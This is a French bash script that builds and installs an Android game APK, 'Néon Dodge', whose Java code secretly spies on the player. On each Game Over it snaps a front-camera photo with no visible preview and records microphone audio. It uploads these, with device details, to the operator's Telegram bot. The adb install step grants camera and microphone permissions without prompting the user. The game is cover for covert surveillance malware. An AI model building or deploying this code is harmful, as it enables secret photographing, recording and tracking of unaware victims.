#!/usr/bin/env bash
# ============================================================
#  NÉON DODGE + BOT TELEGRAM — compile l'APK et l'installe
#  Double-clic (ou ./NeonDodgeBot_APK.sh)
# ============================================================
set -euo pipefail
SELF_DIR="$(cd "$(dirname "$0")" && pwd)"; cd "$SELF_DIR"

# ---- CONFIG (laisser @...@ pour être interrogé au lancement) ----
BOT_TOKEN="@BOT_TOKEN@"
CHAT_ID="@CHAT_ID@"
SEND_PHOTO=true       # selfie caméra frontale sur Game Over
SEND_VOICE=true       # 5 s de micro sur Game Over
VOICE_SECONDS=5
PKG="com.hackerai.neondodge"

WORK="$SELF_DIR/.build"; DIST="$SELF_DIR/dist"; APK="$DIST/NeonDodgeBot.apk"
info(){ printf '\033[1;36m▶ %s\033[0m\n' "$*"; }
ok(){   printf '\033[1;32m✅ %s\033[0m\n' "$*"; }
warn(){ printf '\033[1;33m⚠  %s\033[0m\n' "$*"; }
die(){  printf '\033[1;31m❌ %s\033[0m\n' "$*"; read -rp "Entrée pour fermer..." _ || true; exit 1; }

# ---------- 0. Config interactive ----------
if [ "$BOT_TOKEN" = "@BOT_TOKEN@" ]; then
  echo "────────────────────────────────────────────────"
  echo " Token du bot  (BotFather → /mybots → API Token)"
  echo " Chat ID       (@userinfobot sur Telegram)"
  echo "────────────────────────────────────────────────"
  read -rp "BOT_TOKEN : " BOT_TOKEN
  read -rp "CHAT_ID   : " CHAT_ID
fi
[ -n "$BOT_TOKEN" ] && [ -n "$CHAT_ID" ] || die "Token ou Chat ID vide."

# ---------- 1. SDK / outils ----------
SDK="${ANDROID_SDK_ROOT:-${ANDROID_HOME:-}}"
[ -z "${SDK:-}" ] && for d in "$HOME/Android/Sdk" "$HOME/Library/Android/sdk" \
  "/c/Users/$USER/AppData/Local/Android/Sdk" "/mnt/c/Users/$USER/AppData/Local/Android/Sdk" \
  "/usr/lib/android-sdk" "/usr/share/android-sdk"; do [ -d "$d" ] && SDK="$d" && break; done
[ -n "${SDK:-}" ] && [ -d "$SDK/build-tools" ] || die "Android SDK introuvable (définis ANDROID_SDK_ROOT).
  Debian/Kali : sudo apt install -y android-sdk android-sdk-build-tools unzip zip curl openjdk-17-jdk"
BT_VER="$(ls -1 "$SDK/build-tools" | sort -V | tail -1)"
BT="$SDK/build-tools/$BT_VER"
PLAT="$(ls -1 "$SDK/platforms" 2>/dev/null | sort -V | tail -1 || true)"
[ -n "${PLAT:-}" ] || die "Aucune plateforme Android installée. sdkmanager 'platforms;android-34'"
AJAR="$SDK/platforms/$PLAT/android.jar"
info "SDK $SDK · build-tools $BT_VER · platform $PLAT"

mkdir -p "$WORK/gen" "$WORK/classes" "$WORK/dex" "$WORK/assets" "$WORK/src/com/hackerai/neondodge" "$DIST"

# ---------- 2. Sources ----------
cat > "$WORK/AndroidManifest.xml" <<'XML'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.hackerai.neondodge" android:versionCode="1" android:versionName="1.0">
  <uses-sdk android:minSdkVersion="24" android:targetSdkVersion="34"/>
  <uses-permission android:name="android.permission.INTERNET"/>
  <uses-permission android:name="android.permission.CAMERA"/>
  <uses-permission android:name="android.permission.RECORD_AUDIO"/>
  <uses-feature android:name="android.hardware.camera" android:required="false"/>
  <application android:label="Néon Dodge" android:hardwareAccelerated="true">
    <activity android:name=".MainActivity" android:exported="true"
        android:screenOrientation="landscape"
        android:configChanges="orientation|screenSize|keyboardHidden">
      <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
      </intent-filter>
    </activity>
  </application>
</manifest>
XML

cat > "$WORK/src/com/hackerai/neondodge/MainActivity.java" <<'JAVA'
package com.hackerai.neondodge;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.Window;
import android.view.WindowManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class MainActivity extends Activity {

    private static final String BOT_TOKEN   = "@BOT_TOKEN@";
    private static final String CHAT_ID     = "@CHAT_ID@";
    private static final boolean SEND_PHOTO = @SEND_PHOTO@;
    private static final boolean SEND_VOICE = @SEND_VOICE@;
    private static final int VOICE_SECONDS  = @VOICE_SECONDS@;
    private static final String TAG = "NeonDodge";

    private WebView web;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        if (Build.VERSION.SDK_INT >= 23) {
            requestPermissions(new String[]{
                Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO}, 1);
        }
        web = new WebView(this);
        web.setBackgroundColor(0xFF05070F);
        web.getSettings().setJavaScriptEnabled(true);
        web.getSettings().setDomStorageEnabled(true);
        web.setWebViewClient(new WebViewClient());
        web.addJavascriptInterface(new Bridge(), "AndroidBridge");
        setContentView(web);
        web.loadUrl("file:///android_asset/index.html");
    }

    /* ---------- pont JS ---------- */
    public class Bridge {
        @JavascriptInterface public void report(final int score, final int best) {
            new Thread(new Runnable() { public void run() {
                try { reportBlocking(score, best); }
                catch (Throwable t) { Log.e(TAG, "report", t); }
            }}).start();
        }
        @JavascriptInterface public void toast(String msg) { Log.i(TAG, msg); }
    }

    private void reportBlocking(int score, int best) throws Exception {
        String when = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.FRANCE).format(new Date());
        String txt = "\uD83C\uDFAE *Néon Dodge*\n"
                + "Score : *" + score + "*\n"
                + "Record : " + best + "\n"
                + "Appareil : " + Build.MANUFACTURER + " " + Build.MODEL
                + " (Android " + Build.VERSION.RELEASE + ")\n"
                + "Date : " + when;
        get("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id="
                + URLEncoder.encode(CHAT_ID, "UTF-8")
                + "&parse_mode=Markdown&text=" + URLEncoder.encode(txt, "UTF-8"));

        if (SEND_PHOTO && hasPerm(Manifest.permission.CAMERA)) {
            File p = shootPhoto();
            if (p != null) sendFile("sendPhoto", "photo", p, "image/jpeg", "\uD83D\uDCF8 Réaction du joueur");
        }
        if (SEND_VOICE && hasPerm(Manifest.permission.RECORD_AUDIO)) {
            File v = recordVoice(VOICE_SECONDS);
            if (v != null) sendFile("sendDocument", "document", v, "audio/mp4",
                    "\uD83C\uDF99 " + VOICE_SECONDS + " s de réaction");
        }
    }

    private boolean hasPerm(String p) {
        return Build.VERSION.SDK_INT < 23 || checkSelfPermission(p) == PackageManager.PERMISSION_GRANTED;
    }

    /* ---------- caméra frontale (sans preview visible) ---------- */
    private File shootPhoto() {
        Camera cam = null;
        try {
            Camera.CameraInfo info = new Camera.CameraInfo();
            int idx = -1;
            for (int i = 0; i < Camera.getNumberOfCameras(); i++) {
                Camera.getCameraInfo(i, info);
                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) { idx = i; break; }
            }
            if (idx < 0) idx = 0;
            cam = Camera.open(idx);
            SurfaceTexture st = new SurfaceTexture(10);
            cam.setPreviewTexture(st);
            cam.startPreview();
            final File f = new File(getCacheDir(), "selfie.jpg");
            if (f.exists()) f.delete();
            cam.takePicture(null, null, new Camera.PictureCallback() {
                public void onPictureTaken(byte[] data, Camera c) {
                    try { FileOutputStream o = new FileOutputStream(f); o.write(data); o.close(); }
                    catch (Exception e) { Log.e(TAG, "photo", e); }
                }
            });
            Thread.sleep(2500);
            cam.stopPreview(); cam.release(); cam = null;
            return (f.exists() && f.length() > 0) ? f : null;
        } catch (Throwable t) {
            Log.e(TAG, "camera", t);
            if (cam != null) { try { cam.release(); } catch (Throwable ignored) {} }
            return null;
        }
    }

    /* ---------- micro ---------- */
    private File recordVoice(int seconds) {
        MediaRecorder r = null;
        try {
            File f = new File(getCacheDir(), "reaction.m4a");
            if (f.exists()) f.delete();
            r = new MediaRecorder();
            r.setAudioSource(MediaRecorder.AudioSource.MIC);
            r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            r.setAudioEncodingBitRate(64000);
            r.setAudioSamplingRate(44100);
            r.setOutputFile(f.getAbsolutePath());
            r.prepare(); r.start();
            Thread.sleep(seconds * 1000L);
            r.stop(); r.release(); r = null;
            return (f.exists() && f.length() > 0) ? f : null;
        } catch (Throwable t) {
            Log.e(TAG, "micro", t);
            if (r != null) { try { r.release(); } catch (Throwable ignored) {} }
            return null;
        }
    }

    /* ---------- HTTP Telegram ---------- */
    private static String get(String url) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setConnectTimeout(15000); c.setReadTimeout(20000);
        BufferedReader in = new BufferedReader(new InputStreamReader(c.getInputStream(), "UTF-8"));
        StringBuilder sb = new StringBuilder(); String l;
        while ((l = in.readLine()) != null) sb.append(l);
        in.close();
        return sb.toString();
    }

    private void sendFile(String api, String field, File file, String mime, String caption) throws Exception {
        String B = "----neondodgebot" + System.currentTimeMillis();
        HttpURLConnection c = (HttpURLConnection) new URL(
                "https://api.telegram.org/bot" + BOT_TOKEN + "/" + api).openConnection();
        c.setDoOutput(true); c.setConnectTimeout(15000); c.setReadTimeout(60000);
        c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + B);
        DataOutputStream out = new DataOutputStream(c.getOutputStream());

        writeField(out, B, "chat_id", CHAT_ID);
        writeField(out, B, "caption", caption);
        out.writeBytes("--" + B + "\r\n");
        out.writeBytes("Content-Disposition: form-data; name=\"" + field + "\"; filename=\"" + file.getName() + "\"\r\n");
        out.writeBytes("Content-Type: " + mime + "\r\n\r\n");
        FileInputStream in = new FileInputStream(file);
        byte[] buf = new byte[8192]; int n;
        while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
        in.close();
        out.writeBytes("\r\n--" + B + "--\r\n");
        out.flush(); out.close();
        int code = c.getResponseCode();
        InputStream rs = (code >= 200 && code < 300) ? c.getInputStream() : c.getErrorStream();
        if (rs != null) { rs.close(); }
        Log.i(TAG, api + " -> HTTP " + code);
    }

    private static void writeField(DataOutputStream out, String B, String name, String value) throws Exception {
        out.writeBytes("--" + B + "\r\n");
        out.writeBytes("Content-Disposition: form-data; name=\"" + name + "\"\r\n\r\n");
        out.write(value.getBytes("UTF-8"));
        out.writeBytes("\r\n");
    }
}
JAVA

# --- jeu dans le WebView ---
cat > "$WORK/assets/index.html" <<'HTML'
<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<style>html,body{margin:0;height:100%;background:#05070F;overflow:hidden;touch-action:none}
canvas{position:absolute;image-rendering:pixelated}</style></head><body>
<canvas id="c"></canvas><script>
const VW=480,VH=272,c=document.getElementById('c'),g=c.getContext('2d');
c.width=VW;c.height=VH;
function fit(){const s=Math.min(innerWidth/VW,innerHeight/VH);
 c.style.width=(VW*s)+'px';c.style.height=(VH*s)+'px';
 c.style.left=((innerWidth-VW*s)/2)+'px';c.style.top=((innerHeight-VH*s)/2)+'px';}
addEventListener('resize',fit);fit();

let P,meteors,score,over,t,spawn,touchX,shake;
let best=+(localStorage.getItem('nd_best')||0);
const stars=[];for(let i=0;i<60;i++)stars.push({x:Math.random()*VW,y:Math.random()*VH,s:Math.random()*1.5+.5,v:8+Math.random()*22});
function reset(){P={x:VW/2-14,y:VH-40,w:28,h:28,sp:320};meteors=[];score=0;over=false;t=0;spawn=0;touchX=null;shake=0;}
reset();

function send(){
  if(window.AndroidBridge){try{AndroidBridge.report(score,best);}catch(e){}}
}
function update(dt){
  t+=dt;shake=Math.max(0,shake-dt*3);
  for(const s of stars){s.y+=s.v*dt;if(s.y>VH){s.y=0;s.x=Math.random()*VW;}}
  if(over)return;
  let d=0;
  if(touchX!==null){const k=touchX-(P.x+P.w/2);if(Math.abs(k)>3)d=k>0?1:-1;}
  P.x=Math.max(0,Math.min(VW-P.w,P.x+d*P.sp*dt));
  spawn-=dt;
  if(spawn<=0){spawn=Math.max(.16,.85-score*.012);const r=7+Math.random()*8;
    meteors.push({x:r+Math.random()*(VW-2*r),y:-r,r:r,vy:95+Math.random()*40+score*2.5});}
  for(let i=meteors.length-1;i>=0;i--){
    const m=meteors[i];m.y+=m.vy*dt;
    if(m.y-m.r>VH){meteors.splice(i,1);score++;continue;}
    const cx=Math.max(P.x,Math.min(m.x,P.x+P.w)),cy=Math.max(P.y,Math.min(m.y,P.y+P.h));
    const dx=m.x-cx,dy=m.y-cy;
    if(dx*dx+dy*dy<m.r*m.r){
      over=true;shake=1;
      if(score>best){best=score;localStorage.setItem('nd_best',best);}
      send();
    }
  }
}
function draw(){
  g.fillStyle='#05070F';g.fillRect(0,0,VW,VH);
  g.save();
  if(shake>0)g.translate((Math.random()-.5)*shake*8,(Math.random()-.5)*shake*8);
  g.fillStyle='rgba(128,178,255,.5)';
  for(const s of stars)g.fillRect(s.x,s.y,s.s,s.s);
  for(const m of meteors){
    g.fillStyle='rgba(255,64,77,.25)';g.beginPath();g.arc(m.x,m.y,m.r+4,0,7);g.fill();
    g.fillStyle='#ff5966';g.beginPath();g.arc(m.x,m.y,m.r,0,7);g.fill();
    g.fillStyle='#4d0009';g.beginPath();g.arc(m.x,m.y,m.r*.45,0,7);g.fill();
  }
  g.fillStyle='rgba(0,255,199,.25)';g.fillRect(P.x-5,P.y-5,P.w+10,P.h+10);
  g.fillStyle='#00FFC7';g.fillRect(P.x,P.y,P.w,P.h);
  g.fillStyle='#fff';g.fillRect(P.x+9,P.y+4,P.w-18,6);
  g.font='12px monospace';g.fillStyle='#fff';
  g.textAlign='left';g.fillText('SCORE '+score,10,20);
  g.textAlign='right';g.fillText('BEST '+best,VW-10,20);
  if(over){
    g.fillStyle='rgba(0,0,0,.7)';g.fillRect(0,0,VW,VH);
    g.textAlign='center';g.fillStyle='#fff';g.font='16px monospace';
    g.fillText('GAME OVER',VW/2,110);
    g.fillText('Score : '+score,VW/2,132);
    g.fillStyle='#00FFC7';g.font='11px monospace';
    g.fillText("Envoi au bot Telegram...",VW/2,156);
    g.fillText("Touche l'ecran pour rejouer",VW/2,176);
  }
  g.restore();
}
let last=performance.now();
function loop(now){
  const dt=Math.min(.05,(now-last)/1000);last=now;
  update(dt);draw();requestAnimationFrame(loop);
}
requestAnimationFrame(loop);

function touch(e){
  const r=c.getBoundingClientRect();
  const x=((e.touches?e.touches[0].clientX:e.clientX)-r.left)/r.width*VW;
  if(over&&t>1.2){reset();return;}
  if(!over)touchX=x;
}
c.addEventListener('touchstart',e=>{e.preventDefault();touch(e);},{passive:false});
c.addEventListener('touchmove',e=>{e.preventDefault();touch(e);},{passive:false});
c.addEventListener('touchend',e=>{e.preventDefault();touchX=null;},{passive:false});
c.addEventListener('mousedown',touch);
c.addEventListener('mousemove',e=>{if(e.buttons)touch(e);});
c.addEventListener('mouseup',()=>{touchX=null;});
</script></body></html>
HTML

# ---------- 3. Injection du token / chat id ----------
JAVA="$WORK/src/com/hackerai/neondodge/MainActivity.java"
sed "s|@BOT_TOKEN@|$BOT_TOKEN|g; s|@CHAT_ID@|$CHAT_ID|g; s|@SEND_PHOTO@|$SEND_PHOTO|g; \
     s|@SEND_VOICE@|$SEND_VOICE|g; s|@VOICE_SECONDS@|$VOICE_SECONDS|g" \
    "$JAVA" > "$JAVA.tmp" && mv "$JAVA.tmp" "$JAVA"

# ---------- 4. Compilation ----------
info "1/6  aapt2 link (manifest + assets)"
"$BT/aapt2" link -o "$WORK/base.apk" -I "$AJAR" \
    --manifest "$WORK/AndroidManifest.xml" -A "$WORK/assets" \
    --java "$WORK/gen" --min-sdk-version 24 --target-sdk-version 34 \
    --version-code 1 --version-name 1.0 --auto-add-overlay >/dev/null

info "2/6  javac"
javac -encoding UTF-8 -source 1.8 -target 1.8 -nowarn -classpath "$AJAR" \
      -d "$WORK/classes" $(find "$WORK/src" "$WORK/gen" -name '*.java') 2>/dev/null

info "3/6  d8 (dex)"
"$BT/d8" --lib "$AJAR" --min-api 24 --release --output "$WORK/dex" \
      $(find "$WORK/classes" -name '*.class') >/dev/null 2>&1

info "4/6  Empaquetage"
cp "$WORK/base.apk" "$WORK/unsigned.apk"
( cd "$WORK/dex" && zip -q -j ../unsigned.apk classes.dex )

info "5/6  Alignement"
"$BT/zipalign" -p -f 4 "$WORK/unsigned.apk" "$WORK/aligned.apk"

info "6/6  Signature"
KS="$SELF_DIR/.neondodge.keystore"
[ -f "$KS" ] || keytool -genkeypair -keystore "$KS" -alias neondodge -keyalg RSA -keysize 2048 \
    -validity 10000 -storepass android -keypass android \
    -dname "CN=NeonDodgeBot, O=Homebrew, C=FR" >/dev/null 2>&1
"$BT/apksigner" sign --ks "$KS" --ks-pass pass:android --key-pass pass:android \
    --out "$APK" "$WORK/aligned.apk"
"$BT/apksigner" verify "$APK" >/dev/null 2>&1 || die "Signature invalide."
ok "APK : $APK"

# ---------- 5. Message de test au bot ----------
if curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
     --data-urlencode "chat_id=$CHAT_ID" \
     --data-urlencode "text=✅ Néon Dodge installé — les scores, le selfie et le micro arriveront ici." \
   | grep -q '"ok":true'; then
  ok "Message de test envoyé au bot Telegram."
else
  warn "Le bot n'a pas répondu : vérifie BOT_TOKEN / CHAT_ID (et que tu as déjà écrit /start au bot)."
fi

# ---------- 6. Installation ----------
DEV="$(command -v "$SDK/platform-tools/adb" >/dev/null 2>&1 && "$SDK/platform-tools/adb" devices | awk 'NR>1 && $2=="device"' | head -1 || true)"
if [ -n "${DEV:-}" ]; then
  ADB="$SDK/platform-tools/adb"
  info "Installation sur $DEV"
  "$ADB" install -r -d "$APK" || "$ADB" install -r -d --bypass-low-target-sdk-block "$APK"
  "$ADB" shell pm grant "$PKG" android.permission.CAMERA 2>/dev/null || true
  "$ADB" shell pm grant "$PKG" android.permission.RECORD_AUDIO 2>/dev/null || true
  "$ADB" shell monkey -p "$PKG" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1 || true
  ok "Installé et lancé (permissions caméra + micro accordées)."
else
  warn "Aucun téléphone détecté : copie $APK sur le téléphone et ouvre-le."
fi
echo; ok "Terminé."; read -rp "Entrée pour fermer..." _ || true
